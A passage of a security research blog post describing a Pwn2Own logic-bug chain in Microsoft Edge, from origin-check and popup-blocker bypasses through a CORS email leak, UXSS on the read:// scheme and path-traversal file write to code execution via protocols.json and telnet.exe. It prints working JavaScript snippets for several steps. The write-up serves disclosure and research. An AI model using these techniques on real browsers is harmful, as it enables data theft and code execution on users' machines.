+<p>The first challenge, as we mentioned earlier: this UXSS has to be fired from certain Microsoft sites. Though we could still find an XSS there to make that happen, that sounds like a painful job, so we’d keep it as a last resort. Instead, we decided to see if there was any low-hanging fruit in the origin check first.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">content</span><span class="o">::</span><span class="n">WebContents</span><span class="o">*</span> <span class="n">web_contents</span> <span class="o">=</span> <span class="n">navigation_handle</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">GetWebContents</span><span class="p">();</span>
+<span class="k">const</span> <span class="n">GURL</span> <span class="n">last_committed_url</span> <span class="o">=</span> <span class="n">web_contents</span><span class="o">-&gt;</span><span class="n">GetLastCommittedURL</span><span class="p">();</span>
+
+<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">IsSupportedLoginUrl</span><span class="p">(</span><span class="n">last_committed_url</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">content</span><span class="o">::</span><span class="n">NavigationThrottle</span><span class="o">::</span><span class="n">CANCEL_AND_IGNORE</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We found that <code class="language-plaintext highlighter-rouge">EdgeCAGuidanceNavigationThrottle</code> uses <code class="language-plaintext highlighter-rouge">GetLastCommittedURL()</code> to retrieve the origin that fired the navigation, and then check it. At first glance, this looks like the correct way to do the validation. But take a second look, and you’ll notice Microsoft seems to have forgotten that a navigation can come not just from the current <code class="language-plaintext highlighter-rouge">WebContents</code>, but also from another window… So a simple <code class="language-plaintext highlighter-rouge">window.open(...)</code> is enough to bypass it!</p>
+
+<p><em>↓ You can run this on any website to fire the throttle</em></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">popup</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://login.live.com/</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">_blank</span><span class="dl">'</span><span class="p">)</span>
+<span class="nx">popup</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`https://guidance-ca-error/?email={email}&amp;switch_profile={url}`</span> 
+</code></pre></div></div>
+
+<h4 id="2-the-popup-blocker">2. The Popup Blocker</h4>
+
+<p>So far, we can bypass the origin check with a cross-window navigation. However, modern browsers don’t let webpages open new windows that easily nowadays, so here comes another new problem: the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:components/blocked_content/popup_blocker.cc">Popup Blocker</a> would block <code class="language-plaintext highlighter-rouge">window.open(...)</code> by default.</p>
+
+<p><img src="/assets/img/blog/20261028/ef35f43ee835d0270ea21f396330d1c9.png" alt="popup-blocker" /></p>
+
+<p>To crack this, we kept reversing Microsoft Edge. And we found Microsoft, maybe for internal use, made its own hardcoded whitelist for popups… So a popup like the following would normally be blocked as expected:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">popup</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://malicious.tld</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">_blank</span><span class="dl">'</span><span class="p">)</span>      <span class="c1">// blocked</span>
+</code></pre></div></div>
+
+<p>But if you swap the URL for the whitelisted one… the window just appears. And then remember to navigate it back to the original site, and you’ve bypassed the Popup Blocker!</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">popup</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">about:blank#quickAuthPopup</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">_blank</span><span class="dl">'</span><span class="p">)</span> <span class="c1">// granted</span>
+<span class="nx">popup</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://malicious.tld</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>Thank you, Microsoft!</p>
+
+<p><img src="/assets/img/blog/20261028/88bf76a0d43a9dcd2fc9d283cf926148.webp" alt="thanks-microsoft" width="60%" style="display:block;margin:0 auto" /></p>
+
+<h4 id="3-the-need-for-a-signed-in-profile">3. The Need for a Signed-In Profile</h4>
+
+<p>Now that we can fire <code class="language-plaintext highlighter-rouge">EdgeCAGuidanceNavigationThrottle</code> from wherever we want, the next step is to get past the Conditional Access checks. The code first requires Microsoft Edge to already have a signed-in User Profile, and then checks if <code class="language-plaintext highlighter-rouge">?email={email}</code> matches the profile’s email. Both conditions have to be met before we reach the sourceless, browser-initiated navigation to finally trigger our UXSS primitive.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Profile</span><span class="o">*</span> <span class="n">current_profile</span> <span class="o">=</span> <span class="n">Profile</span><span class="o">::</span><span class="n">FromBrowserContext</span><span class="p">(</span>
+    <span class="n">web_contents</span><span class="o">-&gt;</span><span class="n">GetBrowserContext</span><span class="p">());</span>
+
+<span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">email</span><span class="p">;</span>
+<span class="n">net</span><span class="o">::</span><span class="n">GetValueForKeyInQuery</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">kEmailQueryKey</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">email</span><span class="p">);</span>
+
+<span class="k">const</span> <span class="n">base</span><span class="o">::</span><span class="n">FilePath</span> <span class="n">target_profile_path</span> <span class="o">=</span> <span class="n">GetPathOfProfileWithEmail</span><span class="p">(</span><span class="n">email</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">current_profile</span><span class="o">-&gt;</span><span class="n">GetPath</span><span class="p">()</span> <span class="o">!=</span> <span class="n">target_profile_path</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">profiles</span><span class="o">::</span><span class="n">SwitchToProfile</span><span class="p">(</span><span class="n">target_profile_path</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">BindOnce</span><span class="p">(</span><span class="err">…</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>However, since we can’t assume the target environment has a signed-in profile in advance, we still need to find a way to make the attack work even if it doesn’t. While exploring Microsoft Edge, we came across a great feature called “OneAuth”. The feature lets any Edge WebView application automatically sign in with your current MSA credentials when visiting Microsoft-owned sites. And it turns out that starting with 25H2, <a href="https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/customize-oobe-in-windows-11">Windows OOBE</a> requires you to sign in with an MSA (unless you use the local-account workaround). So even if you’ve never created a User Profile in the browser, just visiting <code class="language-plaintext highlighter-rouge">www.microsoft.com</code> is enough for Edge to create one and sign you in automatically.</p>
+
+<p>Thanks again, Microsoft!</p>
+
+<video src="/assets/img/blog/20261028/0c61af2810a8e37b9fc0374c86c2dcc4.mp4" autoplay="" muted="" loop="" playsinline="" preload="metadata" style="display:block;max-width:100%;height:auto;"></video>
+
+<p><br /></p>
+
+<h4 id="4-the-need-for-prior-knowledge-of-the-login-email">4. The Need for Prior Knowledge of the Login Email</h4>
+
+<p>With the sign-in issue cracked, the last challenge is to get the victim’s email in advance. Of course, we could try some social engineering, or keep reversing Microsoft Edge to find another bug that leaks that for us. But since the automatic sign-in already sets several Microsoft cookies, we thought Web Hacking would be an easier way to steal the email. So we fired up Burp Suite and started looking for web vulnerabilities.</p>
+
+<p>We spent a few hours and found several XSS bugs on Microsoft sites. While poking around, I noticed that <code class="language-plaintext highlighter-rouge">assets.msn.com</code>, which is embedded in <code class="language-plaintext highlighter-rouge">edge://new-tab-page-online</code>, returns the currently signed-in user’s email. And even more interesting, when I checked the response header, the site seemed to have a CORS misconfiguration…</p>
+
+<p><img src="/assets/img/blog/20261028/2751c8c61403a3def6649581b64b9199.png" alt="cors-misconfig" /></p>
+
+<p>So with a simple <code class="language-plaintext highlighter-rouge">fetch(...)</code> with credentials included, you can easily grab any Microsoft Edge user’s email from any website:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">`https://assets.msn.com/service/community/users/me?profile=social&amp;it=edgeid`</span><span class="p">,</span> <span class="p">{</span>
+    <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> 
+    <span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cors</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">referrerPolicy</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-referrer</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+        <span class="dl">'</span><span class="s1">Accept</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span>
+    <span class="p">}</span>
+<span class="p">})</span>
+<span class="nx">body</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span> <span class="nx">body</span><span class="p">.</span><span class="nx">value</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">email</span> <span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="putting-it-all-together">Putting It All Together!</h3>
+
+<p>So far, to make this primitive work, we’ve chained together:</p>
+
+<ul>
+  <li>A Trusted Origin bypass caused by a missing cross-window Opener check</li>
+  <li>A Popup Blocker bypass caused by a hardcoded whitelist</li>
+  <li>A OneAuth feature that automatically signs you in</li>
+  <li>A CORS misconfiguration that lets us steal the signed-in user’s email</li>
+</ul>
+
+<p>Now we can finally trigger the UXSS without a single click! And even better, since this UXSS is initiated from the Browser Process (<code class="language-plaintext highlighter-rouge">HandleRendererDebugURL</code> in Mojo, if you’re interested), it can ignore any CSP entirely. That means we can run JavaScript on <code class="language-plaintext highlighter-rouge">google.com</code>, <code class="language-plaintext highlighter-rouge">facebook.com</code>, <code class="language-plaintext highlighter-rouge">icloud.com</code>, or whatever website we want!</p>
+
+<h2 id="breaking-out-of-the-browser-sandbox">Breaking Out of the Browser Sandbox</h2>
+
+<p>So we have a Universal XSS. Does it mean that we can do whatever we want? If we’re talking about Web Security, then yes. But our goal here is to get ACE (Arbitrary Code Execution), so UXSS alone is far from enough. And we still need to find a way to break out of the Browser Sandbox to turn this UXSS into code execution.</p>
+
+<p>The first and most straightforward idea that came to my mind was: since we can run JavaScript on any website, or more precisely, any origin, why not just leverage privileged WebUI pages like <code class="language-plaintext highlighter-rouge">edge://settings</code> or <code class="language-plaintext highlighter-rouge">edge://downloads</code> to get ACE?</p>
+
+<p>This naive approach was of course already mitigated by the Chromium developers. In the Renderer’s Mojo handler, there’s an extra check: if the origin belongs to one of the following privileged WebUIs, the Renderer simply ignores the JavaScript URL.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">edge</span>
+<span class="n">chrome</span><span class="o">-</span><span class="n">extension</span>
+<span class="n">chrome</span>
+<span class="n">chrome</span><span class="o">-</span><span class="n">untrusted</span>
+<span class="n">chrome</span><span class="o">-</span><span class="n">distiller</span>
+<span class="n">chrome</span><span class="o">-</span><span class="n">error</span>
+<span class="n">chrome</span><span class="o">-</span><span class="n">native</span>
+<span class="n">chrome</span><span class="o">-</span><span class="n">search</span>
+<span class="n">devtools</span>
+<span class="c1">// more...</span>
+</code></pre></div></div>
+
+<p><em>↓ <strong>Path:</strong> <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:third_party/blink/renderer/core/frame/local_frame.cc">chromium/third_party/blink/renderer/core/frame/local_frame.cc</a></em></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">LocalFrame</span><span class="o">::</span><span class="n">LoadJavaScriptURL</span><span class="p">(</span><span class="k">const</span> <span class="n">KURL</span><span class="o">&amp;</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Protect privileged pages against bookmarklets and other JavaScript</span>
+  <span class="c1">// manipulations.</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">SchemeRegistry</span><span class="o">::</span><span class="n">ShouldTreatURLSchemeAsNotAllowingJavascriptURLs</span><span class="p">(</span>
+          <span class="n">GetSecurityContext</span><span class="p">()</span>
+              <span class="o">-&gt;</span><span class="n">GetSecurityOrigin</span><span class="p">()</span>
+              <span class="o">-&gt;</span><span class="n">GetOriginOrPrecursorOriginIfOpaque</span><span class="p">()</span>
+              <span class="o">-&gt;</span><span class="n">Protocol</span><span class="p">()))</span> <span class="p">{</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="c1">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><em>↓ <strong>Path:</strong> <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:third_party/blink/renderer/platform/weborigin/scheme_registry.cc">chromium/third_party/blink/renderer/platform/weborigin/scheme_registry.cc</a></em></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="n">SchemeRegistry</span><span class="o">::</span><span class="n">ShouldTreatURLSchemeAsNotAllowingJavascriptURLs</span><span class="p">(</span>
+    <span class="k">const</span> <span class="n">String</span><span class="o">&amp;</span> <span class="n">scheme</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">scheme</span><span class="p">,</span> <span class="n">scheme</span><span class="p">.</span><span class="n">LowerASCII</span><span class="p">());</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">scheme</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span>
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">GetURLSchemesRegistry</span><span class="p">().</span><span class="n">not_allowing_javascript_urls_schemes</span><span class="p">.</span><span class="n">Contains</span><span class="p">(</span>
+      <span class="n">scheme</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Basically, Chromium has put every privileged WebUI you can think of on the <code class="language-plaintext highlighter-rouge">not_allowing_javascript_urls_schemes</code> blacklist. So at that point, I still got stuck for a long while. 😖</p>
+
+<h3 id="arbitrary-file-write-via-immersive-reader">Arbitrary File Write via Immersive Reader</h3>
+
+<p>However, as we continued exploring Microsoft Edge, we found that Edge had its own Reading Mode called <a href="https://support.microsoft.com/en-us/education/learning-accelerators/use-immersive-reader-in-microsoft-edge-1">Immersive Reader</a>. And unlike Chrome’s built-in Reading Mode, Immersive Reader seems to have been forked from Chromium early on, with Microsoft building on top of it. So instead of the old <code class="language-plaintext highlighter-rouge">chrome-distiller://</code> or the blacklisted <code class="language-plaintext highlighter-rouge">chrome-untrusted://</code>, Edge uses a custom <code class="language-plaintext highlighter-rouge">read://</code> scheme. And Microsoft seems to have forgotten to add this scheme to the blacklist as well, so our UXSS works on this privileged WebUI :)</p>
+
+<p>Starting from this privileged WebUI, we can access lots of native C++ objects through JavaScript. And one of them called <code class="language-plaintext highlighter-rouge">chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles()</code> looked particularly interesting to me. We tried it out, and found that the function takes two parameters, a filename and a JSON string:</p>
+
+<p><em>↓ We ran this on <code class="language-plaintext highlighter-rouge">read://https_orange.tw/?url=https://orange.tw</code></em></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">chrome</span><span class="p">.</span><span class="nx">edgeFeedbackPrivate</span><span class="p">.</span><span class="nx">zipDiagnosticLogFiles</span><span class="p">(</span>
+    <span class="dl">'</span><span class="s1">LOL.ZIP</span><span class="dl">'</span><span class="p">,</span> 
+    <span class="dl">'</span><span class="s1">{
+        "logFiles": {
+            "ORANGE": "AAAAAAAA"
+        }, 
+        "deviceInfo": {1337: 1337}
+    }</span><span class="dl">'</span>
+<span class="p">)</span>
+</code></pre></div></div>
+
+<p>While playing with it, we observed that Microsoft Edge would first create a temporary folder and write <code class="language-plaintext highlighter-rouge">AAAAAAAA</code> to the file <code class="language-plaintext highlighter-rouge">ORANGE.json</code>. It would then pack the whole folder into <code class="language-plaintext highlighter-rouge">LOL.ZIP</code>, upload it to a Microsoft server, and clean everything up afterward. Of course, you’d want to try <code class="language-plaintext highlighter-rouge">../</code>… Yes, it does let you escape the temporary folder. But that <code class="language-plaintext highlighter-rouge">.json</code> extension is still a bit annoying. Maybe you’re also wondering if a NULL Byte could get rid of it… Of course it can! So now we have an arbitrary file write that can control both the filename and the content, and we can overwrite any file anywhere we want!</p>
+
+<p>Thank you again and again, Microsoft!</p>
+
+<p><img src="/assets/img/blog/20261028/10600c6e96d84ca17944fe3fc6f688b8.svg" alt="a_slide1_smooth" /></p>
+
+<p><br /></p>
+
+<h3 id="overwriting-protocolsjson-to-auto-launch-protocol-handlers">Overwriting <code class="language-plaintext highlighter-rouge">protocols.json</code> to Auto-Launch Protocol Handlers</h3>
+
+<p>Now, we’ve got almost all the pieces. The last step is figuring out how to turn a browser-level arbitrary file write into ACE to complete the chain. We observed that Microsoft Edge would do some interesting side-loading while initializing, such as reading a bunch of config files or loading DLLs from a writable folder.</p>
+
+<p>So the DLL side-loading sounds juicy. However, since our file write is wrapped in JSON, the content has to be a valid UTF-8 string. And because Microsoft Edge is a 64-bit process, we’d have to drop a 64-bit DLL, too. After spending some time working on this, we found that we couldn’t construct a valid 64-bit PE header that met the UTF-8 requirement in any case, so we gave up on DLL side-loading.</p>
+
+<p>We ended up solving this in a less obvious way. We found that besides OneAuth, Edge also loads a bunch of components while initializing, and one of them is “AutoLaunchProtocolsComponent”. The component would read a configuration file called <code class="language-plaintext highlighter-rouge">protocols.json</code> from a folder we can write to, and that file defines which origins are allowed to launch which URL protocol handlers. So by overwriting the file, we can launch any protocol handler from any origin.</p>
+
+<p><em>↓ <strong>Path:</strong> <a href="#procotols-json">AppData\Local\Microsoft\Edge\User Data\AutoLaunchProtocolsComponent\1.0.0.10\protocols.json</a></em></p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"allow"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"origins"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="s2">"https://.get.microsoft.com"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"https://.apps.microsoft.com"</span><span class="w">
+      </span><span class="p">],</span><span class="w">
+      </span><span class="nl">"protocol"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ms-windows-store"</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"origins"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="s2">"https://.onedrive.com"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"https://.onedrive.live.com"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"https://sharepoint.com"</span><span class="w">
+      </span><span class="p">],</span><span class="w">
+      </span><span class="nl">"protocol"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ms-word"</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="err">//</span><span class="w"> </span><span class="p">[</span><span class="err">...</span><span class="p">]</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"warn"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="err">//</span><span class="w"> </span><span class="p">[</span><span class="err">...</span><span class="p">]</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"block"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="err">//</span><span class="w"> </span><span class="p">[</span><span class="err">...</span><span class="p">]</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>As for how do we get Microsoft Edge to re-initialize? Just use our earlier browser-initiated navigation to jump to <code class="language-plaintext highlighter-rouge">edge://restart</code>! :)</p>
+
+<h3 id="from-telnet-to-code-execution">From <code class="language-plaintext highlighter-rouge">telnet://</code> to Code Execution!</h3>
+
+<p>Here we chose <code class="language-plaintext highlighter-rouge">telnet://</code> to get code execution. On Windows, the telnet handler would try to invoke <code class="language-plaintext highlighter-rouge">telnet.exe</code>, but the binary isn’t shipped by default, so Windows goes looking for it in the directories listed in the PATH environment variable. And one of those directories just happens to be writable by us…</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\WINDOWS\system32</span><span class="w">
+</span><span class="nx">C:\WINDOWS</span><span class="w">
+</span><span class="n">C:\WINDOWS\System32\Wbem</span><span class="w">
+</span><span class="nx">C:\WINDOWS\System32\WindowsPowerShell\v1.0</span><span class="w">
+</span><span class="n">C:\WINDOWS\System32\OpenSSH</span><span class="w">
+</span><span class="nx">C:\Users\lowpriv\AppData\Local\Microsoft\WindowsApps</span><span class="w">    </span><span class="c"># &lt;--- it's writable for `lowpriv`...</span><span class="w">
+</span></code></pre></div></div>
+
+<p>So by simply dropping a modified <code class="language-plaintext highlighter-rouge">protocols.json</code> and a 32-bit tiny PE, we got ACE. The whole exploit is less than 100 lines of code. The restart isn’t really necessary in a real attack, only for Pwn2Own. Let’s check out the demo! 🔥</p>
+
+<iframe width="100%" height="315" src="https://www.youtube.com/embed/oZRT-8U0l1c?si=Ky7dHon9t65oyu3Q&amp;controls=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+
+<p><br /></p>
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+
+<p>From zero experience with modern browser exploitation to completing the full chain, the whole research took me two full months, with no LLMs/AI involved at all. But why, you might ask? Perhaps because it sounds cool, or maybe it was also just good timing — I only started using coding agents like Codex and Claude Code around March this year, and by then, I’d already found all the bugs and done the hard part ¯\_(ツ)_/¯</p>
+
+<p>So what’s the hard part? For memory corruption, it’s often the exploitation. But we’re playing with logic bugs, where the hard part is finding them, and once you find them all, chaining is the easiest part. So that’s also why I kept the whole exploit AI-free.</p>
+
+<p>Apart from that, I also see the UXSS primitive as a new attack surface, and agree that in the AI era, “<a href="https://x.com/steventseeley/status/2035096238178410582">Attack Surface is the new 0day</a>”. I wanted to explore this gold mine more before sharing it with the AI giants. That’s another reason why I decided not to use AI on this chain.</p>
+
+<p>Of course, I’m not some old-fashioned guy who refuses to try new things, either. Outside of this chain, I’m also tokenmaxxing and addicted to AI. I believe once you’ve tasted how convenient LLMs are, no one would want to go back to hunting bugs by hand. That’s also the future, I think.</p>
+
+<p>I’m also not that afraid of being replaced by AI. I’d rather say it’s precisely because of AI, I finally have enough time to finish all the cool stuff that’s been sitting on my TODO list… like the Windows RCE <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-58608">I just reported</a>, flipping the chain to <a href="https://youtu.be/Bh1zglq4mLE">pop Microsoft Edge from <code class="language-plaintext highlighter-rouge">calc.exe</code></a>, or porting this logic-only full chain to Google Chrome (almost there &gt;&lt;). I’ll also show some progress at <a href="https://codeblue.jp/en/program/time-table/day1-t1-08-origin-we-trust/">CODE BLUE</a> in Japan next month. Stay tuned! 😉</p>
+
+<p>So instead of worrying about how low the bar for vuln research can go, why not get excited about how high AI can take us? What fun can we have, what even cooler hacks can we build, and what impossible things can we make happen…?</p>
+
+<p><br /></p>
+
+<p>Never Stop Exploiting!</p>
+
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+         <!-- 作者 -->
+        <section>
+            <div class="container article_footer">
+                <div class="author_info">
+                    <a href="/en/blog/author/orange">
+                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/orange.png);"></div>
+                    </a>
+                    <div>
+                        <a class="author" href="/en/blog/author/orange">
+                            <h3>Orange Tsai</h3>
+                        </a>
+                        <span>Principal Security Researcher</span>
+                        <p>
+                            I am Orange : )
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+
+    </div>
+
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Services</h6>
+        <ul>
+            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
+            <li><a href="/en/services/opsr/">Offensive Product Security Research</a></li>
+            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
+            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
+            <li><a href="/en/services/security-training/">Security Training</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Research</h6>
+        <ul>
+            <li><a href="/en/research/overview/">Overview</a></li>
+            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
+            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
+            <li><a href="/en/research/talks/">International Conferences</a></li>
+            <li><a href="/en/research/cve/">CVE List</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Company</h6>
+        <ul>
+            <li><a href="/en/company/about/">Company Overview</a></li>
+            <li><a href="/en/company/our-team/">Team Members</a></li>
+            <li><a href="/en/company/history/">Achievements</a></li>
+            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
+            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
+            <li><a href="/en/contact/">Contact</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">News</h6>
+        <ul>
+            <li><a href="/en/blog/">Blog</a></li>
+            <li><a href="/en/media-kit/">Media Resources</a></li>
+        </ul>
+    </div>
+
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
+
+    <div class="copyright">
+        <div class="info">
+            <span>© 2026 DEVCORE <b class="line-block">All rights reserved.</b></span>
+            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
+
+</div>
+    </footer>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
